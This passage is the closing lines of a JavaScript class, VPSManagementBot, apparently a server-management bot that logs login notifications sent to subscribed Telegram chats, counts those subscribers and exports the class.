        console.log(`📤 Login notification sent to ${this.chatIds.size} Telegram users`);
    }

    getSubscribedUsers() {
        return this.chatIds.size;
    }
}

module.exports = VPSManagementBot;